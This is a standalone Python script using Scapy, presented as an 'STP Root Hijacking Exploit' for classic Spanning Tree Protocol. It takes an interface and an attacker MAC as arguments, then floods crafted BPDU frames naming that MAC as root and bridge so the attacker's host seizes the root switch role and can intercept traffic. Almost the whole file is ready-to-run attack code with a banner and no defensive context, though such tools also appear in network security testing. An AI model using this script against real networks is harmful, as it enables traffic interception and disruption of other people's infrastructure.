#!/usr/bin/env python3

#Import Scapy
from scapy.all import *
from scapy.layers.l2 import *
import argparse

print (r"""
  ▄████  ██▀███   ██▓▄▄▄█████▓
 ██▒ ▀█▒▓██ ▒ ██▒▓██▒▓  ██▒ ▓▒
▒██░▄▄▄░▓██ ░▄█ ▒▒██▒▒ ▓██░ ▒░
░▓█  ██▓▒██▀▀█▄  ░██░░ ▓██▓ ░ 
░▒▓███▀▒░██▓ ▒██▒░██░  ▒██▒ ░ 
 ░▒   ▒ ░ ▒▓ ░▒▓░░▓    ▒ ░░   
  ░   ░   ░▒ ░ ▒░ ▒ ░    ░    
░ ░   ░   ░░   ░  ▒ ░  ░      
      ░    ░      ░          
""")
print ("STP Root Hijacking Exploit")
print ("For the classic version of Spanning Tree Protocol")
print("\nAuthor: Caster, @c4s73r, <c4s73r@protonmail.com>\n")

STPMulticast = "01:80:C2:00:00:00"


def take_arguments():
    parser = argparse.ArgumentParser()
    parser.add_argument("--interface", dest="interface", type=str, required=True, help="Choose the interface to attack")
    parser.add_argument("--mac", dest="evilmac", type=str, required=True, help="Specify your MAC")
    args = parser.parse_args()
    return args

def exploit(interface, yourmac):
    frame = Dot3(src=args.evilmac, dst=STPMulticast)
    llc_layer = LLC(dsap=0x042, ssap=0x042, ctrl=3)
    evil_stp = STP(rootmac=args.evilmac, bpduflags=0x01, bridgemac=args.evilmac)
    crafted = frame / llc_layer / evil_stp
    print("[+] Start of STP injection. Interception of the root switch role... You can check this from Wireshark")
    sendp(crafted, iface=args.interface, inter=2, loop=1, verbose=1)


args = take_arguments()
exploit(args.interface, args.evilmac)
